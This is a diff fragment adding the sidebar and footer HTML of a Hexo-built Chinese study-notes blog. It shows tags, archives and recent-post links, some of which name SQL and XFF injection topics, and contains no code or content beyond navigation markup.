+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Markdown/" rel="tag">Markdown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" rel="tag">学习记录</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Markdown/" style="font-size: 10px;">Markdown</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">学习记录</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/04/">四月 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/02/">二月 2025</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2026/04/28/mysql%E6%B3%A8%E5%85%A5/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2026/04/28/xff%E6%B3%A8%E5%85%A5/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2026/04/27/markdown/">Markdown 语法基础</a>
+          </li>
+        
+          <li>
+            <a href="/2026/04/27/php/">php 语法基础</a>
+          </li>
+        
+          <li>
+            <a href="/2026/04/12/mysql/">mysql</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 zmdclj<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
